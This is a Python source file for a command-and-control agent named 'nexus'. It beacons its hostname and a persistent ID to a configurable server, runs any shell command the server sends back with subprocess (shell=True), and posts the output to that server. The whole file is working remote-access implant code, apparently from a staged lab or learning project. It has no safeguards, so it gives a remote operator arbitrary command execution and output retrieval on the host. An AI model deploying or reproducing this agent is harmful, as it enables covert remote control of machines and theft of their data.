import json
import logging
import os
import socket
import subprocess
import sys
import time
import uuid

import requests

from protocol import (
    MSG_NOP, MSG_TASK, MSG_RESULT, MSG_BEACON, MSG_ERROR,
    MSG_NAMES, pack_clear, unpack_clear, esperar_beacon, encode_beacon,
)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(name)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("nexus.agent")

SERVER_URL    = os.environ.get("NEXUS_SERVER", "http://127.0.0.1:8080")
AGENT_ID_FILE = "agent_id.txt"


# ---------------------------------------------------------------------------
# Agent identity
# ---------------------------------------------------------------------------

def load_or_create_agent_id() -> str:
    if os.path.exists(AGENT_ID_FILE):
        with open(AGENT_ID_FILE) as f:
            aid = f.read().strip()
        if aid:
            return aid
    aid = str(uuid.uuid4())
    with open(AGENT_ID_FILE, "w") as f:
        f.write(aid)
    log.info("new agent_id=%s (saved to %s)", aid, AGENT_ID_FILE)
    return aid


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

def _post_frame(session: requests.Session, frame: bytes) -> bytes:
    resp = session.post(
        SERVER_URL + "/",
        data=frame,
        headers={"Content-Type": "application/octet-stream"},
        timeout=10,
    )
    resp.raise_for_status()
    return resp.content


# ---------------------------------------------------------------------------
# Command execution (Fase 2)
# ---------------------------------------------------------------------------

def _run_task(session: requests.Session, agent_id: str, payload: bytes) -> None:
    try:
        task    = json.loads(payload.decode("utf-8"))
        task_id = task.get("task_id", "?")
        cmd     = task.get("cmd", "")
        timeout = int(task.get("timeout_s", 30))
    except Exception as exc:
        log.error("could not parse TASK: %s", exc)
        return

    log.info("TASK  task_id=%.8s cmd=%r", task_id, cmd)
    try:
        proc = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout,
        )
        result = {
            "agent_id":  agent_id,
            "task_id":   task_id,
            "exit_code": proc.returncode,
            "stdout":    proc.stdout,
            "stderr":    proc.stderr,
            "ts":        int(time.time()),
        }
    except subprocess.TimeoutExpired:
        result = {
            "agent_id":  agent_id,
            "task_id":   task_id,
            "exit_code": -1,
            "stdout":    "",
            "stderr":    f"timeout after {timeout}s",
            "ts":        int(time.time()),
        }

    frame = pack_clear(MSG_RESULT, json.dumps(result).encode("utf-8"))
    _post_frame(session, frame)
    log.info("RESULT task_id=%.8s exit=%d", task_id, result["exit_code"])


# ---------------------------------------------------------------------------
# Main beacon loop
# ---------------------------------------------------------------------------

def run() -> None:
    agent_id = load_or_create_agent_id()
    hostname = socket.gethostname()
    log.info("starting — agent_id=%.8s server=%s", agent_id, SERVER_URL)

    with requests.Session() as session:
        while True:
            frame = pack_clear(MSG_BEACON, encode_beacon(agent_id, hostname, ts=int(time.time())))

            try:
                resp_raw = _post_frame(session, frame)
            except requests.RequestException as exc:
                log.error("connection error: %s — retry in 10s", exc)
                time.sleep(10)
                continue

            if not resp_raw:
                log.warning("empty response")
                esperar_beacon()
                continue

            try:
                msg_type, resp_payload = unpack_clear(resp_raw)
            except ValueError as exc:
                log.warning("bad response frame: %s", exc)
                esperar_beacon()
                continue

            name = MSG_NAMES.get(msg_type, f"0x{msg_type:02x}")

            if msg_type == MSG_NOP:
                log.info("NOP")
            elif msg_type == MSG_TASK:
                _run_task(session, agent_id, resp_payload)
            elif msg_type == MSG_ERROR:
                log.error("ERROR from server")
            else:
                log.warning("unexpected response: %s", name)

            esperar_beacon()
